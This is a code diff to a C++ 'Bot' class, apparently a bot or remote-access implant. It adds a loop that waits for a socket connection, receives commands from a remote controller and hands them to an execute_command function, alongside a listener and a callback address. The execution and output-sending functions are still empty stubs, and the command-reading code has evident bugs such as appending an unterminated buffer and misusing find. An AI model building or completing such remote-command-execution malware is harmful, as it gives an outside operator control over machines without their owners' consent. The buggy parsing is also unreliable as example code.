@@ -1,12 +1,13 @@
 #include "bot.hpp"
 #include <arpa/inet.h>
+#include <iostream>
 #include <netinet/in.h>
 #include <random>
 #include <string>
 #include <sys/socket.h>
-#include <unistd.h>
-#include <iostream>
 #include <system_error>
+#include <unistd.h>
+#include <cstdio>
 
 Bot::Bot(const sockaddr_in *cbaddr) {
     std::random_device rd;
@@ -64,7 +65,7 @@ int Bot::callback() {
 int Bot::start_listener() {
     int res;
 
-    std::cout << "INFO: Creating Listener\n";
+    std::cout << "INFO: Creating Listener on " << m_listener_port << "\n";
     res = create_listener();
     if (res == -1) {
         std::cout << "FAIL: Failed to create listener\n";
@@ -73,7 +74,6 @@ int Bot::start_listener() {
     }
     std::cout << "SUCCESS: Created listener\n";
     m_listener = res;
-    
 
     std::cout << "INFO: Starting accept loop\n";
     res = background_listener();
@@ -100,14 +100,34 @@ int Bot::stop_listener() {
     return 0;
 }
 
+void Bot::rce_loop() {
+    std::string cmd;
+    std::string output;
+
+    while (true) {
+        if (!is_connected()) {
+            std::cout << "INFO: Waiting for connection...\n";
+            sleep(10);
+            continue;
+        }
+
+        std::cout << "INFO: Waiting for command...\n";
+        cmd = get_command();
+        std::cout.flush();
+        std::cout << "COMMAND: " << cmd << "\n";
+        output = execute_command(cmd);
+        std::cout << "OUTPUT: " << output << "\n";
+    }
+}
+
 int Bot::background_listener() {
     try {
         m_listener_thread = std::thread(&Bot::accept_loop, this);
-    } catch (const std::system_error& e) {
+    } catch (const std::system_error &e) {
         std::cout << "EXCEPTION: " << e.what() << "\n";
         return -1;
     }
-    
+
     return 0;
 }
 
@@ -166,4 +186,44 @@ void Bot::accept_loop() {
 
         m_rce = res;
     }
+}
+
+std::string Bot::get_command() {
+    ssize_t res;
+    size_t total = 0;
+    size_t buff_size = 4096;
+    char buff[buff_size];
+    std::string cmd;
+    cmd.clear();
+
+    while (true) {
+        res = recv(m_rce, buff, buff_size, 0);
+        if (res == -1) {
+            break;
+        }
+
+        if (res == 0) {
+            close(m_rce);
+            m_rce = -1;
+            break;
+        }
+
+        total += res;
+        cmd.append(buff);
+        if (cmd.find("\n", 0)) {
+            break;
+        }
+    }
+
+    cmd.pop_back();
+    cmd.resize(total);
+    return cmd;
+}
+
+std::string Bot::execute_command(std::string cmd) {}
+
+int Bot::send_output(std::string output) {}
+
+bool Bot::is_connected() {
+    return m_rce > -1;
 }
